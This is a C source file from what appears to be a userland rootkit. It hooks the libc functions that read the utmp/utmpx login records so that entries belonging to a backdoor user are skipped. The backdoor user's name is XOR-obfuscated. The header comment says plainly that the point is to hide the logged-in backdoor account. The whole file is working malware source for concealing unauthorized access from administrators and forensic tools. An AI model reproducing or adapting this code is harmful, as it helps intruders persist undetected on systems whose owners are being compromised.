/*
 * These are the functions responsible for reading
 * entries from the utmp file.
 *
 * The utmp file may contain information about the
 * currently logged in backdoor user, but ain't
 * nobody seeing it up front.
 *
 * See 'putut.c' for more information.
 */

struct utmp *getutid(const struct utmp *ut)
{
    struct utmp *tmp;

    hook(CGETUTID);
    xor(bd_uname, BD_UNAME);

    do {
        tmp = call(CGETUTID, ut);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
    
    clean(bd_uname);
    return tmp;
}

struct utmpx *getutxid(const struct utmpx *utx)
{
    struct utmpx *tmp;

    hook(CGETUTXID);
    xor(bd_uname, BD_UNAME);

    do {
        tmp = call(CGETUTXID, utx);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
    
    clean(bd_uname);
    return tmp;
}

struct utmp *getutline(const struct utmp *ut)
{
    struct utmp *tmp;

    hook(CGETUTLINE);
    xor(bd_uname, BD_UNAME);

    do {
        tmp = call(CGETUTLINE, ut);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
    
    clean(bd_uname);
    return tmp;
}

struct utmpx *getutxline(const struct utmpx *utx)
{
    struct utmpx *tmp;

    hook(CGETUTXLINE);
    xor(bd_uname, BD_UNAME);

    do {
        tmp = call(CGETUTXLINE, utx);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
    
    clean(bd_uname);
    return tmp;
}

struct utmp *getutent(void)
{
    struct utmp *tmp;

    hook(CGETUTENT);
    xor(bd_uname, BD_UNAME);

    do {
        tmp = call(CGETUTENT);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));
    
    clean(bd_uname);
    return tmp;
}

struct utmpx *getutxent(void)
{
    struct utmpx *tmp;

    hook(CGETUTXENT);
    xor(bd_uname, BD_UNAME);
    
    do {
        tmp = call(CGETUTXENT);
        if(tmp == NULL) continue;
    }while(tmp && !strncmp(tmp->ut_user, bd_uname, sizeof(tmp->ut_user)));

    clean(bd_uname);
    return tmp;
}

void getutmp(const struct utmpx *ux, struct utmp *u)
{
    if(hide_me) return;

    if(ux && ux->ut_user != NULL)
    {
        xor(bd_uname, BD_UNAME);
        if(!strncmp(ux->ut_user, bd_uname, sizeof(ux->ut_user))) hide_me = 1;
        clean(bd_uname);
    }

    if(hide_me) return;
    hook(CGETUTMP);
    (void)call(CGETUTMP, ux, u);
    return;
}

void getutmpx(const struct utmp *u, struct utmpx *ux)
{
    if(hide_me) return;

    if(u && u->ut_user != NULL)
    {
        xor(bd_uname, BD_UNAME);
        if(!strncmp(u->ut_user, bd_uname, sizeof(u->ut_user))) hide_me = 1;
        clean(bd_uname);
    }

    if(hide_me) return;
    hook(CGETUTMPX);
    (void)call(CGETUTMPX, u, ux);
}
